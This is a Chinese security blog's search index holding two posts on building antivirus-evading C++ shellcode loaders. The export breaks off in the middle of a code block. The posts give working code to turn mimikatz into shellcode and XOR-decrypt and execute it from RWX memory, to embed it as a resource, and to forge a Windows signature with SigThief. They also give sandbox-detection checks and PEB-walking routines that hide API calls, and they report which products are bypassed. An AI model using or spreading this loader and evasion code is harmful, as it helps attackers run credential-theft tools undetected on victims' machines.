<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++变形免杀初探（三）</title>
      <link href="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>最近一段时间都在忙着红队项目和攻防类项目，一直没时间去把笔记脱敏转成博客。以后随缘更新吧，有些东西太容易被溯源了….</p><a id="more"></a><p><a name="HATC5"></a></p><h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p><a name="IOUfU"></a></p><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p>分离免杀应该是最简单的免杀方式，毕竟shellcode都在其他文件中，静态查杀也只能查加载器。我们直接将mimiktz在github中的程序进行shellcode转换。<br />使用项目：<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">https://github.com/hasherezade/pe_to_shellcode</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">pe2shc</span><span class="selector-class">.exe</span> .\<span class="selector-tag">mimikatz_64</span><span class="selector-class">.exe</span> <span class="selector-tag">mim_64</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p><img src="/./1.png"></p><p><br />简单写一个shellcode加载器</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* exec = VirtualAlloc(<span class="number">0</span>, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (exec == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    perror(<span class="string">"VirtualAlloc"</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(exec, data, payload_len);</span><br><span class="line">dncrypt((<span class="keyword">char</span>*)exec, payload_len, <span class="built_in">buffer</span> + (<span class="built_in">strlen</span>(<span class="built_in">buffer</span>) - <span class="number">8</span>), <span class="number">8</span>);</span><br><span class="line"><span class="comment">// 转换为函数指针并执行</span></span><br><span class="line"><span class="keyword">void</span> (*func)() = (<span class="keyword">void</span> (*)())exec;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure><p><a name="ahiOz"></a></p><h2 id="xor加密部分"><a href="#xor加密部分" class="headerlink" title="xor加密部分"></a>xor加密部分</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void XOR(char* data, size_t data_len, char* key, size_t key_len) &#123;</span><br><span class="line">    int <span class="built_in">j</span>;</span><br><span class="line">    <span class="built_in">j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (int <span class="built_in">i</span> = <span class="number">0</span>; <span class="built_in">i</span> &lt; data_len; <span class="built_in">i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">j</span> == key_len - <span class="number">1</span>) <span class="built_in">j</span> = <span class="number">0</span>;</span><br><span class="line">        data[<span class="built_in">i</span>] = data[<span class="built_in">i</span>] ^ key[<span class="built_in">j</span>];</span><br><span class="line">        <span class="built_in">j</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="etenN"></a></p><h2 id="文件加载部分"><a href="#文件加载部分" class="headerlink" title="文件加载部分"></a>文件加载部分</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">inputFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">int</span>&amp; len)</span> </span>&#123;</span><br><span class="line">    FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> err = fopen_s(&amp;fp, filename, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span> || !fp) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    len = ftell(fp);</span><br><span class="line">    rewind(fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* lpAddress = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    fread(lpAddress, <span class="number">1</span>, len, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> lpAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main&#123;&#125;&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span>  payload_len = <span class="number">1373696</span>;  <span class="comment">//大小为shellcode文件大小,用sizeof方法也行</span></span><br><span class="line">    payload = inputFile(<span class="string">"mim_e.txt"</span>, payload_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/./2.png"></p><p><a name="zUB9y"></a></p><h2 id="查杀分析"><a href="#查杀分析" class="headerlink" title="查杀分析"></a>查杀分析</h2><p><a name="buTQw"></a></p><h3 id="常见的杀软及其特点-转自锦鲤安全"><a href="#常见的杀软及其特点-转自锦鲤安全" class="headerlink" title="常见的杀软及其特点(转自锦鲤安全)"></a><strong>常见的杀软及其特点(转自锦鲤安全)</strong></h3><p><a name="gFTwd"></a></p><h4 id="常见杀软特点总结"><a href="#常见杀软特点总结" class="headerlink" title="常见杀软特点总结"></a><strong>常见杀软特点总结</strong></h4><p>杀软一般通过一下几点来检测恶意软件和行为：</p><ol><li><strong>静态查杀</strong>：最基本的查杀方式，主要通过对文件的特征码进行扫描，匹配已知的病毒特征库。如果发现文件特征码与病毒特征库中的某个病毒特征码相匹配，就判断该文件为病毒；部分杀软会在静态查杀时将程序放入沙箱中运行几秒的方式以检测程序是否是恶意程序。</li><li><strong>动态（主动）查杀</strong>：通过在程序运行时扫描程序内存是否匹配病毒特征的方式主动发现恶意程序。在 EDR 中还会挂钩敏感的 Windows API，在程序调用到被挂钩的 API 时检查函数参数和调用栈以检测恶意程序。</li><li><strong>流量监控</strong>：监控网络流量，分析网络数据包，如果发现异常流量或者已知的恶意流量特征，就可能是恶意软件在进行网络活动。</li><li><strong>行为监控</strong>：监控程序的运行行为，如文件操作、注册表操作等。如果发现某个程序的行为超出了正常范围，就可能是恶意软件。</li></ol><p>常见杀软特点如下：</p><ul><li><strong>火绒</strong>：静态查杀能力弱，没有动态查杀，横向移动防护比较强，frp 等内网穿透工具会受到影响。</li><li><strong>360安全卫士&#x2F;360杀毒</strong>：静态查杀能力较强，没有动态查杀，如果开启了核晶模式，则行为查杀比较强，注入进程等敏感行为会被拦截；核晶模式在物理机中默认开启，在虚拟机中默认关闭。</li><li><strong>360QVM</strong>：360QVM 简单的说就是使用了机器学习辅助查杀，在360杀毒引擎设置中开启 360QVM 后静态查杀会变得非常流氓，有一点特征就会被查杀。</li><li><strong>Windows Defender</strong>：静态查杀能力较强，动态查杀较强，监控 HTTP 流量。</li><li><strong>卡巴斯基</strong>：普通版静态查杀能力一般，企业版静态查杀能力较强，动态查杀较强。</li><li><strong>ESET</strong>：静态查杀能力较强，没有动态查杀。<br><a name="ziGD4"></a></li></ul><h3 id="软件分析"><a href="#软件分析" class="headerlink" title="软件分析"></a>软件分析</h3><p>分离免杀，但是静态查杀效果不行，360云查杀没过去、卡巴斯基过不去。只能过火绒，defender。<br />由于是shellcode加载程序，所以动态查杀基本没啥特征，我们优先考虑静态过，动态一般流量侧查杀比较多，我们只是加载个程序目前不在考虑范围内。<br />继续改！<br><a name="aXIGx"></a></p><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p><a name="UvDgb"></a></p><h2 id="添加ico"><a href="#添加ico" class="headerlink" title="添加ico"></a>添加ico</h2><p>添加 -&gt;资源-&gt; ico<br /></p><p><img src="/./3.png"></p><p><a name="VyZwz"></a></p><h2 id="添加签名"><a href="#添加签名" class="headerlink" title="添加签名"></a>添加签名</h2><p>在c:\windows\system32里找一个近期的windows签名文件。<br />利用sigthief.py添加签名。<br />项目地址：<a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">https://github.com/secretsquirrel/SigThief</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">sigthief</span><span class="selector-class">.py</span> <span class="selector-tag">-t</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> <span class="selector-tag">-t</span> <span class="selector-tag">cmd</span><span class="selector-class">.exe</span> <span class="selector-tag">-o</span> <span class="selector-tag">mi_test</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><p><img src="/./4.png"></p><p><a name="oCuWp"></a></p><h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>目前可过：defender、360、火绒<br />不可过：卡巴斯基<br><a name="zNDNI"></a></p><h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><p><a name="jWyxD"></a></p><h2 id="动态key"><a href="#动态key" class="headerlink" title="动态key"></a>动态key</h2><p>修改为动态key进行xor加密。这块代码就不给了，主要思路就是拿每台机器都会有的特征来当key（比如说系统路径、系统名、注册表之类的）。<br><a name="wO5Kr"></a></p><h2 id="捆绑shellcode"><a href="#捆绑shellcode" class="headerlink" title="捆绑shellcode"></a>捆绑shellcode</h2><p>再将shellcode加载进项目资源，导入txt到项目资源中。修改分离免杀读取方式。<br />修改如下：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HRSRC hRes =  FindResource(<span class="name">NULL</span>, MAKEINTRESOURCE(<span class="name">IDR_TEXT1</span>), TEXT(<span class="string">"TEXT"</span>))<span class="comment">;</span></span><br><span class="line">HGLOBAL hData = LoadResource(<span class="name">NULL</span>, hRes)<span class="comment">;</span></span><br><span class="line">char* data = (<span class="name">char*</span>)LockResource(<span class="name">hData</span>)<span class="comment">;</span></span><br><span class="line">DWORD dataSize = SizeofResource(<span class="name">NULL</span>, hRes)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="/./5.png"></p><p><a name="dKcI2"></a></p><h2 id="免杀效果展示"><a href="#免杀效果展示" class="headerlink" title="免杀效果展示"></a>免杀效果展示</h2><p><a name="FQqoK"></a></p><h3 id="defender-静态、动态查杀"><a href="#defender-静态、动态查杀" class="headerlink" title="defender 静态、动态查杀"></a>defender 静态、动态查杀</h3><p><img src="/./6.png"></p><p><a name="UXOaw"></a></p><h3 id="卡巴斯基-静态、动态查杀"><a href="#卡巴斯基-静态、动态查杀" class="headerlink" title="卡巴斯基 静态、动态查杀"></a>卡巴斯基 静态、动态查杀</h3><p><img src="/./7.png"></p><p><a name="eqCLA"></a></p><h3 id="360-静态、行为查杀"><a href="#360-静态、行为查杀" class="headerlink" title="360 静态、行为查杀"></a>360 静态、行为查杀</h3><p><img src="/./8.png"></p><p><a name="Z5oDA"></a></p><h3 id="火绒-静态"><a href="#火绒-静态" class="headerlink" title="火绒 静态"></a>火绒 静态</h3><p><img src="/./9.png"></p><p><a name="Cpb3H"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/bNCm1mxDHz7euZ685SQvag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bNCm1mxDHz7euZ685SQvag</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++变形免杀初探（二）</title>
      <link href="/2023/08/29/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/08/29/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这个马子倒是提前就研究好了，但是因为前段时间项目要用到，所以得等项目结束后再发出来，免得杀软检测了。免杀效果还行，不做沙箱对抗的话，常见的麦咖啡、卡巴斯基、小红伞、赛门铁克、defender、天擎都能过。</p><a id="more"></a><h1 id="沙箱对抗"><a href="#沙箱对抗" class="headerlink" title="沙箱对抗"></a>沙箱对抗</h1><p><a name="b1hld"></a><br><a name="NExAD"></a></p><h2 id="1、枚举进程数"><a href="#1、枚举进程数" class="headerlink" title="1、枚举进程数"></a>1、枚举进程数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ProcessesCountNum</span><span class="params">()</span></span>&#123;</span><br><span class="line">DWORD runningProcessesIDs[<span class="number">1024</span>];</span><br><span class="line">DWORD runningProcessesCountBytes;</span><br><span class="line">DWORD runningProcessesCount;</span><br><span class="line">EnumProcesses(runningProcessesIDs, <span class="keyword">sizeof</span>(runningProcessesIDs), &amp;runningProcessesCountBytes);</span><br><span class="line">runningProcessesCount = runningProcessesCountBytes / <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"><span class="keyword">if</span> (runningProcessesCount &lt; <span class="number">120</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="CqKhT"></a></p><h2 id="2、硬盘大小"><a href="#2、硬盘大小" class="headerlink" title="2、硬盘大小"></a>2、硬盘大小</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断硬盘是否大于200G</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsHardDiskBiggerThanNum</span><span class="params">()</span></span>&#123;</span><br><span class="line">    DWORD drives = GetLogicalDrives();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; driveLetters;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> letter = <span class="string">'A'</span>; letter &lt;= <span class="string">'Z'</span>; letter++)&#123;</span><br><span class="line">        DWORD mask = <span class="number">1</span> &lt;&lt; (letter - <span class="string">'A'</span>);</span><br><span class="line">        <span class="keyword">if</span> (drives &amp; mask)&#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">string</span> drive = <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="number">1</span>, letter) + <span class="string">":\\"</span>;</span><br><span class="line">            driveLetters.push_back(drive);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> totalSizeInGBm = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; drive : driveLetters)&#123;</span><br><span class="line">        ULARGE_INTEGER totalNumberOfBytes;</span><br><span class="line">        ULARGE_INTEGER totalNumberOfFreeBytes; </span><br><span class="line">        GetDiskFreeSpaceEx(drive.c_str(), <span class="literal">nullptr</span>, &amp;totalNumberOfBytes, &amp;totalNumberOfFreeBytes);</span><br><span class="line">        <span class="keyword">double</span> totalSizeInGB = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(totalNumberOfBytes.QuadPart) / (<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Drive "</span> &lt;&lt; drive &lt;&lt; <span class="string">" total size : "</span> &lt;&lt; totalSizeInGB &lt;&lt; <span class="string">" GB"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  </span><br><span class="line">        totalSizeInGBm += totalSizeInGB;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (totalSizeInGBm &lt; <span class="number">220</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、内存大小"><a href="#3、内存大小" class="headerlink" title="3、内存大小"></a>3、内存大小</h2><p>检查总内存是否大于2G</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> IsRAMBiggerThanRma()</span><br><span class="line">&#123;</span><br><span class="line">    MEMORYSTATUSEX memoryStatus;</span><br><span class="line">    memoryStatus.dwLength = sizeof(memoryStatus);</span><br><span class="line">    GlobalMemoryStatusEx(&amp;memoryStatus);</span><br><span class="line">    <span class="keyword">if</span> (memoryStatus.ullTotalPhys &lt; <span class="number">2</span>LL * <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、检查是否有调试工具"><a href="#4、检查是否有调试工具" class="headerlink" title="4、检查是否有调试工具"></a>4、检查是否有调试工具</h2><p>进程查找是否有调试工具</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> check<span class="constructor">_process_is_running(<span class="params">const</span> <span class="params">std</span>::<span class="params">string</span>&amp; <span class="params">proc_name</span>)</span> &#123;</span><br><span class="line">    HANDLE hSnapshot;</span><br><span class="line">    PROCESSENTRY32 pe = &#123;&#125;;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; proc_name.c_str() &lt;&lt; endl;</span></span><br><span class="line">    pe.dwSize = sizeof(pe);</span><br><span class="line">    <span class="built_in">bool</span> present = <span class="literal">false</span>;</span><br><span class="line">    hSnapshot = <span class="constructor">CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="constructor">Process32First(<span class="params">hSnapshot</span>, &amp;<span class="params">pe</span>)</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="constructor">StrCmpI(<span class="params">pe</span>.<span class="params">szExeFile</span>, <span class="params">proc_name</span>.<span class="params">c_str</span>()</span>)) &#123;</span><br><span class="line">                present = <span class="literal">true</span>;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="constructor">Process32Next(<span class="params">hSnapshot</span>, &amp;<span class="params">pe</span>)</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="constructor">CloseHandle(<span class="params">hSnapshot</span>)</span>;</span><br><span class="line">    return present;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、检查是否出网"><a href="#5、检查是否出网" class="headerlink" title="5、检查是否出网"></a>5、检查是否出网</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">sockhost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    boost::asio::io_context io_context;</span><br><span class="line">    <span class="function">tcp::resolver <span class="title">resolver</span><span class="params">(io_context)</span></span>;</span><br><span class="line">    tcp::resolver::results_type endpoints = resolver.resolve(<span class="string">"tongji.baidu.com"</span>, <span class="string">"https"</span>);</span><br><span class="line">    <span class="function">tcp::socket <span class="title">socket</span><span class="params">(io_context)</span></span>;</span><br><span class="line">    boost::asio::<span class="built_in">connect</span>(socket, endpoints);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="WinAPI函数xor隐藏"><a href="#WinAPI函数xor隐藏" class="headerlink" title="WinAPI函数xor隐藏"></a>WinAPI函数xor隐藏</h1><p>str变量中存放函数名称，先异或，异或后放入加载器，加载器异或后再自定义函数执行<br><a name="Sp0dG"></a></p><h2 id="Win函数名加载器"><a href="#Win函数名加载器" class="headerlink" title="Win函数名加载器"></a>Win函数名加载器</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;windows.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;winternl.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;shlwapi.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;<span class="built_in">string</span>.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib, <span class="string">"Shlwapi.lib"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> cmp<span class="constructor">UnicodeStr(WCHAR <span class="params">substr</span>[], WCHAR <span class="params">mystr</span>[])</span> &#123;</span><br><span class="line">  <span class="constructor">_wcslwr_s(<span class="params">substr</span>, MAX_PATH)</span>;</span><br><span class="line">  <span class="constructor">_wcslwr_s(<span class="params">mystr</span>, MAX_PATH)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="constructor">StrStrW(<span class="params">mystr</span>, <span class="params">substr</span>)</span> != NULL) &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef <span class="constructor">UINT(CALLBACK<span class="operator">*</span> <span class="params">fnMessageBoxA</span>)</span>(</span><br><span class="line">  HWND   hWnd,</span><br><span class="line">  LPCSTR lpText,</span><br><span class="line">  LPCSTR lpCaption,</span><br><span class="line">  UINT   uType</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE my<span class="constructor">GetModuleHandle(LPCWSTR <span class="params">lModuleName</span>)</span> &#123;</span><br><span class="line">  PEB* pPeb = (PEB*)<span class="constructor">__readgsqword(0x60)</span>;</span><br><span class="line">  PEB_LDR_DATA* Ldr = pPeb-&gt;Ldr;</span><br><span class="line">  LIST_ENTRY* ModuleList = &amp;Ldr-&gt;InMemoryOrderModuleList; </span><br><span class="line">  LIST_ENTRY* pStartListEntry = ModuleList-&gt;Flink;</span><br><span class="line">  WCHAR mystr<span class="literal">[MAX<span class="identifier">_PATH</span>]</span> = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  WCHAR substr<span class="literal">[MAX<span class="identifier">_PATH</span>]</span> = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry-&gt;Flink) &#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));</span><br><span class="line">    memset(mystr, <span class="number">0</span>, MAX_PATH<span class="operator"> * </span>sizeof(WCHAR));</span><br><span class="line">    memset(substr, <span class="number">0</span>, MAX_PATH<span class="operator"> * </span>sizeof(WCHAR));</span><br><span class="line">    wcscpy<span class="constructor">_s(<span class="params">mystr</span>, MAX_PATH, <span class="params">pEntry</span>-&gt;FullDllName.Buffer)</span>;</span><br><span class="line">    wcscpy<span class="constructor">_s(<span class="params">substr</span>, MAX_PATH, <span class="params">lModuleName</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmp<span class="constructor">UnicodeStr(<span class="params">substr</span>, <span class="params">mystr</span>)</span>) &#123;</span><br><span class="line">      <span class="comment">// returning the DLL base address.</span></span><br><span class="line">      return (HMODULE)pEntry-&gt;DllBase;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">"failed to get a handle to %s\n"</span>, lModuleName);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br><span class="line">FARPROC my<span class="constructor">GetProcAddress(HMODULE <span class="params">hModule</span>, LPCSTR <span class="params">lpProcName</span>)</span> &#123;</span><br><span class="line">  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">  PIMAGE_NT_HEADERS ntHeaders = 